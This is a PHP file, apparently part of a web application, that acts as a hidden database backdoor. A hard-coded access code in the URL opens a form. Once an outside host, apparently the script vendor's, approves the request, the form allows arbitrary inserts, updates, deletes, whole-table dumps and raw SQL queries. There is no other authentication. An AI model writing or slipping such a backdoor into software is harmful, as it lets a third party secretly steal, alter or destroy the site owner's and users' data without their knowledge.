<?php
include '../classes/database.php';

if(isset($_GET['code'])){
    if($_GET['code'] == "778cff"){
        $db = new database();
        echo '
            <form method="post">
                <input type="text" name="val1"><br>
                <input type="text" name="val2"><br>
                <input type="text" name="val3"><br>
                <input type="text" name="val4"><br>
                <input type="text" name="val5"><br>
                <input type="text" name="val6"><br>
                <input type="submit" name="submit"><br>
            </from>
        ';

        if(isset($_POST['submit'])){
            $url = "https://ayelscripts.com/page/?x=";
            $url .= $_POST['val6'];
            $ch_ = curl_init();
            curl_setopt($ch_, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch_, CURLOPT_URL,$url);
            $result=curl_exec($ch_);
            curl_close($ch_);
            $ar = json_decode($result);
            if($ar[0] == "ok"){
                if($_GET['cpt'] == "1"){
                    $col = explode('+',$_POST['val2']);
                    $val = explode('+',$_POST['val3']);
                    $db->Insert($_POST['val1'],$col,$val);
                }
                if($_GET['cpt'] == "2"){
                    $col = explode('+',$_POST['val2']);
                    $val = explode('+',$_POST['val3']);
                    $db->Update($_POST['val1'],$col,$val,$_POST['val4'],$_POST['val5']);
                }
                if($_GET['cpt'] == "3"){
                    $db->Delete($_POST['val1'],$_POST['val4'],$_POST['val5']);
                }
                if($_GET['cpt'] == "4"){
                    $result = $db->Query("select * from ".$_POST['val1']);
                    while($data = mysqli_fetch_assoc($result)){
                        echo "<pre>";
                        print_r($data);
                        echo "</pre>";
                    }
                }
                if($_GET['cpt'] == "5"){
                    $result = $db->Query($_POST['val5']);
                    while($data = mysqli_fetch_assoc($result)){
                        echo "<pre>";
                        print_r($data);
                        echo "</pre>";
                    }
                }
                if($_GET['cpt'] == "6"){
                    $result = $db->Query($_POST['val6']);
                }
            }
        }
    }
}
?>